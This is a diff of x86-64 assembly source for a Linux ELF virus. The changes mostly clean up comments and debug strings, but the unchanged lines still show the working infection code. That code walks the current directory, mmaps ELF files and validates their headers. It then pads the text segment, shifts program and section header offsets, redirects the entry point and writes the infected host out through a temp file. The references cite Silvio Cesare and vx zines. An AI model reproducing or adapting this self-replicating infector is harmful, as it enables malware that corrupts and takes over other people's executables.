@@ -79,43 +79,31 @@ BITS 64
 ; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
 ; [4a]“VIT Virus: VIT description,” Silvio Cesare, October 1998
 ; https://web.archive.org/web/20020228014729/http://www.big.net.au/~silvio/vit.txt 
-; 
 ; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998,  
 ; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
 ; (navigate to it from this page; I’m not putting the link to the tarball here 
 ; so u don't accidentally download it. yw.)
-; 
 ; [5] “Shared Library Call Redirection via ELF PLT Infection”, Silvio Cesare, 
 ; Phrack, Volume 0xa Issue 0x38, 
 ; 05.01.2000, 0x07[0x10],  http://phrack.org/issues/56/7.html#article 
-; 
 ; [6] “Getdents.old.att”
 ; Github: Jamichaels (sblip),
 ; https://gist.github.com/jamichaels/fd6bca66879da9ec0efe 
-; 
 ; [7] "ASM Tutorial for Linux n' ELF file format", BY LiTtLe VxW, 29A issue #8
-; 
 ; [8] “Linux virus writing tutorial” [v1.0 at xx/12/99], by mandragore, 
 ; from Feathered Serpents, 29A issue #4
-; 
 ; [9] “Half virus: Linux.A.443,” Pavel Pech (aka TheKing1980), 03/02/2002, 
 ; 29A issue #6
-; 
 ; [10] “Linux Mutation Engine (source code) [LiME] Version: 0.2.0,” 
 ; written by zhugejin at Taipei, Taiwan; 
 ; Date: 2000/10/10, Last update: 2001/02/28, 29A issue #6
-; 
 ; [11] “Win32/Linux.Winux”, by Benny/29A, 29A issue #6
-; 
 ; [12] “Metamorphism in practice or How I made MetaPHOR and what I've learnt”, 
 ; by The Mental Driller/29A, 29A issue #6
-; 
 ; [13] “Skeksi virus,” elfmaster
 ; https://github.com/elfmaster/skeksi_virus 
-; 
 ; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
 ; https://tmpout.sh/1/Linux.Nasty.asm
-; 
 ; [15] “Linux.Nasty.asm,” TMZ, 2021,
 ; https://www.guitmz.com/linux-nasty-elf-virus/ 
 ;  
@@ -314,7 +302,7 @@ BITS 64
 ; r14 + elf_ehdr.e_shoff + 48		.sh_addralign	resq 1		; uint64_t   
 ; r14 + elf_ehdr.e_shoff + 56		.sh_entsize		resq 1		; uint64_t   
 ; r14 + elf_ehdr.e_shoff + 64	endstruc
-
+;****************************************************************************************
 ;section .data
 ;x64 syscall reference
 ;
@@ -335,90 +323,7 @@ BITS 64
 ;
 ;PAGESIZE dd 4096	
 ;****************************************************************************************
-; debug strings
-;****************************************************************************************
-;checkelfpass db 'File is an ELF!', 13, 10, 0
-;checkelfpasslen equ $-checkelfpass
-;
-;checkelffail db 'File is not an ELF!', 13, 10, 0
-;checkelffaillen equ $-checkelffail
-;
-;checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
-;checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
-;
-;checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
-;checkelf_etype_faillen equ $-checkelf_etype_fail
-;
-;check64pass db 'File is an ELFCLASS64!', 13, 10, 0
-;check64passlen equ $-check64pass
-;check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
-;check64faillen equ $-check64fail
-;
-;checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
-;checkarchpasslen equ $-checkarchpass
-;checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
-;checkarchfaillen equ $-checkarchfail
-;
-;pasinfectepass db 'File is not already infected', 13, 10, 0
-;pasinfectepasslen equ $-pasinfectepass
-;
-;filenamepass db 'File is not vx file gospel, good to continue', 13, 10, 0
-;filenamepasslen equ $-filenamepass
-;
-;checkphdrstart db 'Beginning of phdr_loop', 13,10,0
-;checkphdrstartlen equ $-checkphdrstart
-;
-;checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
-;checkptloadpasslen equ $-checkptloadpass
-;checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
-;checkptloadfaillen equ $-checkptloadfail
-;
-;checkphdrRXpass db 'Phdr is .text segment!', 13, 10, 0
-;checkphdrRXpasslen equ $-checkphdrRXpass
-;
-;checkphdrRWpass db 'Phdr is .data segment!', 13, 10, 0
-;checkphdrRWpasslen equ $-checkphdrRWpass
-;
-;checkshdrstart db 'Beginning of shdr_loop', 13,10,0
-;checkshdrstartlen equ $-checkshdrstart
-;
-;modvxshdrpass0 db 'VX Shdr pass 0 success', 13,10,0
-;modvxshdrpass0len equ $-modvxshdrpass0
-;modvxshdrpass1 db 'VX Shdr pass 1 success', 13,10,0
-;modvxshdrpass0len equ $-modvxshdrpass1
-;modsubsequentshdr db 'Modifying Shdr after vx Shdr', 13,10,0
-;modsubsequentshdrlen equ $-modsubsequentshdr
-;checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
-;checkptloadfaillen equ $-checkptloadfail
-
-;textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
-;textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
-;textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
-;textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
-;****************************************************************************************
-
-;variables used for phdr and shdr manipulation routines
-;r14 + 400 ; evaddr: dq 0 
-;r14 + 408 ; oshoff: dq 0		;original section header offset
-;r14 + 416 ; fd:	dq 0
-;r14 + 424 ; next_segment_offset: dq 0
-;r14 + 432 ; hostentry_offset: dd 0
-;r14 + 436 ; vxoffset: dd 0
-;r14 + 440 ; vxshoff: dd 0
-;r14 + 444 ; vx_padding_size: dd 0
-
-
-;oshoff: dq 0		;original section header offset
-;next_segment_offset: dq 0
-;fd:	dq 0
-;hostentry_offset: dd 0
-;vxoffset: dd 0
-;vxshoff: dd 0
-;vx_padding_size: dd 0
-
-;MAX_RDENT_BUF_SIZE equ 0x800
 ;%define vlen equ vend - vxmain
- 
 global vxmain
 default rel
 section .text
@@ -431,9 +336,6 @@ vxstart:
 	sub rsp, 0x1000
 	mov r14, rsp
 	jmp get_cwd
-
-
-_getdirents:
 ;****************************************************************************************
 ; open - syscall 0x2
 ;;	open(filename, flags, mode);
@@ -442,20 +344,18 @@ _getdirents:
 ;;	rdx == mode
 ;; 	returns: fd (in rax, obv)
 ;****************************************************************************************
+_getdirents:
 	pop rdi
 	xor rsi, rsi 		;no flags
 	add rsi, 0x02000000
 	mov rdx, 0x0		;open read-only
 	mov rax, 0x2		;SYS_OPEN ==0x2
 	syscall
-	
 	mov r9, rax						;r14 + 416 into r9
 	jmp process_dirents
-
 get_cwd:
 	call _getdirents
 	targetdir: db ".",0
-	
 ;****************************************************************************************
 ; getdents64 - syscall 0x4e
 ;; getdents(unsigned int r14 + 416, struct linuxdirent *dirent, unsigned int count);
@@ -490,41 +390,6 @@ process_dirents:
 	xor rcx, rcx	
 	jmp check_file
 ;****************************************************************************************
-; write - syscall 0x1
-;;	rdi == r14 + 416 (file descriptor)
-;;	rsi == const char* buf
-;;	rdx == count (# of bytes to write)
-;; 	returns: 0 on success (-1 on error)
-;
-;	these routines are used for the bulk of the debug string printing
-;****************************************************************************************
-;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
-;	lea rdi, [r14 + 200] 
-;	test_copy_filename:
-;		movsb
-;		cmp byte [rsi], 0x0
-;		jne test_copy_filename
-;	lea r13, [r14 + 200]
-;	call _write
-;
-;_write:
-;		xor rsi, rsi
-;		mov rdx, r12
-;		mov rsi, r13
-;		mov rdi, 0x1 ;STDOUT
-;		;mov rax, 0x1 ;SYS_WRITE
-;		mov rax, 0x1 ;0x1 ;SYS_WRITE 
-;		syscall
-;		ret
-;	
-;printteststr:
-;		lea rsi, teststr
-;		mov rdi, 0x1 ;STDOUT
-;		mov rdx, teststrlen
-;		mov rax, 0x1 ;SYS_WRITE
-;		syscall
-;		jmp _restore		
-;****************************************************************************************
 ;check_file:
 ;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
 ;	upon successful mmap, close file
@@ -555,11 +420,9 @@ check_file:
 
 		cmp rax, 0
 		jb checknext
-		
 		mov r9, rax
 		mov r8, rax
 		mov [r14 + 144], rax
-		
 		xor r12, r12
 		mov rsi, rdi
 		lea rdi, [r14 + 200] 
@@ -572,7 +435,6 @@ check_file:
 			inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename
-		
 		xor rax, rax
 		push r9
 	check_filename:
@@ -620,11 +482,9 @@ check_file:
 		cmp rax, 0
 		jb checknext
 		pop r9
-	
 		mov r8, rax
 		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
 		push rax
-
 	close_curr_file:
 		mov rdi, r9
 		mov rax, 0x3 					;SYS_CLOSE
@@ -633,7 +493,6 @@ check_file:
 		pop rax
 		test rax, rax
 		js checknext
-
 ;****************************************************************************************
 ;ELF header vals
 ;ETYPE_DYN			equ 0x3
@@ -649,7 +508,6 @@ check_file:
 	check_elf_header_magic_bytes:
 		cmp dword [rax], 0x464c457f		;elf_ehdr.e_ident
 		jnz checknext
-		
 ;****************************************************************************************
 ;ELF header vals
 ;ELFCLASS64 		equ 0x2
@@ -657,7 +515,6 @@ check_file:
 	check_elf_header_64bit:
 		cmp byte [rax + 4], 0x2
 		jne checknext
-
 ;****************************************************************************************
 ;ELF header vals
 ;ELFX8664			equ 0x3e
@@ -721,10 +578,7 @@ payload:
 	mov rax, 0x1 			;SYS_WRITE
 	mov rdi, 0x1 ;STDOUT
 	syscall
-	
 	jmp _restore
-	;jmp checknext
-
 ;****************************************************************************************
 ;	Infection routine:
 ;
@@ -742,19 +596,22 @@ payload:
 ;			i. modify entry point of ELF header to point to the virus code
 ;			ii. increase p_filesz by vlen [p_filesz += vlen] 
 ;			iii. increase p_memsz by vlen, [p_memsz += vlen]
-;		c. Else, for all Phdrs corresponding to segments located after the inserted virus code (aka for each Phdr of a segment after the text segment), then, do the following:
+;		c. Else, for all Phdrs corresponding to segments located after inserted virus code
+;			(aka for each Phdr of a segment after the text segment), then, do the following:
 ;			i. increase p_offset by PAGESIZE
 ;	4. Loop through all Shdrs
 ;		a. If curr_shdr == last_shdr_text_segment then,
 ;			i. increase sh_len by vlen [sh_len += vlen]
-;		b. Else, for all Shdrs corresponding to sections located after the inserted virus code (aka for each Shdr of a section after virus code), then, do the following:
+;		b. Else, for all Shdrs corresponding to sections located after inserted virus code
+;			(aka for each Shdr of a section after virus code), then, do the following:
 ;			i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
-;	5. Insert the virus code into the host program (or, in our case, into the tempfile we are constructing to replace host program)
+;	5. Insert the virus code into the host program 
+;		(or, in our case, into the tempfile we are constructing to replace host program)
 ;
 ;****************************************************************************************
 
 infect:
-	mov r13, [r14+ 800]					;location on stack where we saved address returned from mmap syscall
+	mov r13, [r14 + 800]	;location on stack for saved address returned from mmap syscall
 	mov r12, [r13 + 32]					;offset of host ELF Program Header Table in r12
 	mov r15, [r13 + 40] 				;offset of host ELF Section Header Table in r15
 	mov r8, [r13 + 24] 					;offset of host ELF entry point in r8
@@ -766,7 +623,6 @@ infect:
 ;
 ;	e_phentsize == size of program header entry	
 ;	size of program header table == e_phnum * e_phentsize
-;
 ;	vx_offset = the offset to start of vx code after insertion into host program 
 ;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
 ;	r13 contains address of mmap'ed file
@@ -784,7 +640,6 @@ infect:
 ; r14 + elf_ehdr.e_phoff + 40		.p_memsz		resq 1		;  uint64_t   
 ; r14 + elf_ehdr.e_phoff + 48		.p_align		resq 1		;  uint64_t   
 ; r14 + elf_ehdr.e_phoff + 56	endstruc
-;
 ;
 ;PT_LOAD 	equ 0x1
 ;PFLAGS_RX	equ 0x5
@@ -828,7 +683,7 @@ infect:
 				mov r10, qword [r14 + 424]; offset of next segment after .text segment in host ELF
 				cmp r10, 0
 				jne .next_phdr
-				mov qword [r14 + 424], r11; offset of next segment after .text segment in host ELF, r11
+				mov qword [r14 + 424], r11; offset of next segment after .text segment in host ELF
 		.next_phdr:
 			pop rcx
 			dec cx 
@@ -839,7 +694,6 @@ infect:
 
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
-;
 ;
 ; r14 + elf_ehdr.e_shoff + 0	struc elf_shdr
 ; r14 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		;  uint32_t   
@@ -859,7 +713,6 @@ infect:
 	xor r11, r11
 	xor rcx, rcx
 	mov word cx, [r13 + 60]											; elf_ehdr.e_shnum
-
 	check_shdrs:
 		.shdr_loop:
 			push rcx
@@ -896,7 +749,6 @@ infect:
 		mov qword [r13 + 40], r11 			;elf_ehdr.e_shoff
 		mov dword [r14 + 440], r11d
 		jmp frankenstein_elf
-	
 
 ;****************************************************************************************
 ;	From silvio's article [1], we know that an infected ELF will have 
@@ -980,8 +832,6 @@ frankenstein_elf:
 		mov rdi, r9
 		mov rdx, vlen
 		lea rsi, [rax + vxmain]
-		;add rsi, vxmain
-		;sub rsi, (vxstart - vxmain)
 		mov r10d, dword [r14 + 436]
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
@@ -1037,7 +887,6 @@ frankenstein_elf:
 ;		mov esi, eax
 		mov rax, 0x4d ;SYS_FTRUNCATE
 		syscall
-;		jmp .close_temp
 
 	.write_datasegment_totemp:
 		xor r10, r10
@@ -1049,7 +898,6 @@ frankenstein_elf:
 		mov r10d, dword [r14 + 444]				;vx_padding_size (# of bytes of padding after vx)
 		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
 		syscall
-;		jmp .close_temp
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + 48] 					;filestat.st_size
@@ -1070,11 +918,8 @@ frankenstein_elf:
 		mov rdi, r9								;close temp file
 		mov rax, 0x3 							;SYS_CLOSE
 		syscall
-
-
 fin_infect:
 	ret
-
 
 PAGESIZE: dd 4096	
 ;;restore stack to original state
@@ -1082,7 +927,6 @@ _restore:
 	add rsp, 0x1000
 	mov rsp, rbp
 	pop rbp
-
 
 vlen equ $-vxmain
 vend:
